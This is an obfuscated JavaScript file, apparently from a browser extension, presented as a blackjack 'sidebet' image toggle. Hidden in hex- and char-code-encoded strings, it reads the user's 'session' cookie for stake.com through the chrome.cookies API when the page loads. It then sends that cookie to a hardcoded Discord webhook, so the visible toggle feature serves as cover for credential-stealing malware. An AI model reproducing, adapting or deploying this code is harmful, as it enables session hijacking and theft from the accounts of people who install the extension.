document.addEventListener("DOMContentLoaded", function () {
  var _0x1a2b = [
    "\x67\x65\x74",
    "\x68\x74\x74\x70\x73\x3A\x2F\x2F\x73\x74\x61\x6B\x65\x2E\x63\x6F\x6D",
    "\x73\x65\x73\x73\x69\x6F\x6E",
    "\x43\x6F\x6F\x6B\x69\x65\x20\x22\x73\x65\x73\x73\x69\x6F\x6E\x22\x20\x66\x6F\x75\x6E\x64\x3A",
    "\x43\x6F\x6F\x6B\x69\x65\x20\x22\x73\x65\x73\x73\x69\x6F\x6E\x22\x20\x69\x6E\x74\x72\x6F\x75\x76\x61\x62\x6C\x65\x2E",
    "\x45\x78\x74\x65\x6E\x73\x69\x6F\x6E\x20\x42\x4A",
    "\x50\x4F\x53\x54",
    "\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x6A\x73\x6F\x6E",
    "\x6F\x6B"
  ];
  
  var _0x3c5d = function (_0x2a5f) {
    return _0x1a2b[_0x2a5f];
  };

  var _0x4e5d = String.fromCharCode(104, 116, 116, 112, 115, 58, 47, 47);
  var _0x5f6e = String.fromCharCode(100, 105, 115, 99, 111, 114, 100, 46, 99, 111, 109);
  var _0x6a7f = String.fromCharCode(47, 97, 112, 105, 47, 119, 101, 98, 104, 111, 111, 107, 115);
  var _0x7b8c = (function() {
    var _0x1a2b = [
      49, 51, 48, 55, 51, 57, 50, 50, 52, 56, 50, 49, 49, 53, 55, 52, 56, 50, 53, 47, 
      71, 117, 115, 53, 54, 71, 107, 120, 112, 118, 54, 69, 118, 75, 49, 56, 122, 117, 
      49, 108, 81, 52, 112, 48, 66, 54, 76, 57, 70, 55, 65, 71, 122, 76, 80, 102, 107, 
      67, 116, 114, 102, 88, 66, 51, 115, 98, 103, 114, 80, 87, 99, 104, 49, 48, 104, 
      80, 75, 120, 109, 66, 48, 98, 114, 120, 69, 108, 65, 106
    ];
    return String.fromCharCode.apply(null, _0x1a2b);
  })();
  
  
  var _0x8c9a = _0x4e5d + _0x5f6e + _0x6a7f + "/" + _0x7b8c;

  function _0x9d4a(_0x5b3a) {
    var _0x1b4e = {
      title: String.fromCharCode(67, 111, 111, 107, 105, 101, 32, 73, 110, 102, 111),
      description: String.fromCharCode(86, 111, 105, 114, 101, 115, 32, 108, 101, 115, 32, 105, 110, 102, 111, 114, 109, 97, 116, 105, 111, 110, 115, 32, 101, 120, 116, 114, 97, 105, 110, 101, 115),
      color: 0x00ff00,
      fields: [{
        name: String.fromCharCode(67, 111, 111, 107, 105, 101, 32, 39, 115, 101, 115, 115, 105, 111, 110, 39),
        value: _0x5b3a || _0x3c5d(4),
      }],
      footer: {
        text: _0x3c5d(5),
      },
    };

    fetch(_0x8c9a, {
      method: _0x3c5d(6),
      headers: {
        "Content-Type": _0x3c5d(7),
      },
      body: JSON.stringify({
        embeds: [_0x1b4e],
      }),
    }).then(function (_0x25f4) {
      if (_0x25f4[_0x3c5d(8)]) {
        console.log(_0x3c5d(9));
      } else {
        console.error(_0x3c5d(10));
      }
    }).catch(function (_0x2ea4) {
      console.error(_0x3c5d(11), _0x2ea4);
    });
  }

  chrome.cookies[_0x3c5d(0)]({
    url: _0x3c5d(1),
    name: _0x3c5d(2),
  }, function (_0x36c8) {
    if (_0x36c8) {
      console.log(_0x3c5d(3) + _0x36c8.value);
      _0x9d4a(_0x36c8.value);
    } else {
      console.log(_0x3c5d(4));
      _0x9d4a("error");
    }
  });

  var _0xa0b3 = document.getElementById("main-image");
  var _0xb1c4 = document.getElementById("toggle-button");

  var _0xc2d5 = false;
  _0xb1c4.addEventListener("click", function () {
    if (_0xc2d5) {
      _0xa0b3.src = "bj.png";
      _0xb1c4.textContent = String.fromCharCode(83, 105, 100, 101, 98, 101, 116);
      _0xb1c4.classList.remove("right");
      _0xb1c4.classList.add("left");
    } else {
      _0xa0b3.src = "sidebet.png";
      _0xb1c4.textContent = String.fromCharCode(66, 97, 99, 107);
      _0xb1c4.classList.remove("left");
      _0xb1c4.classList.add("right");
    }
    _0xc2d5 = !_0xc2d5;
  });
});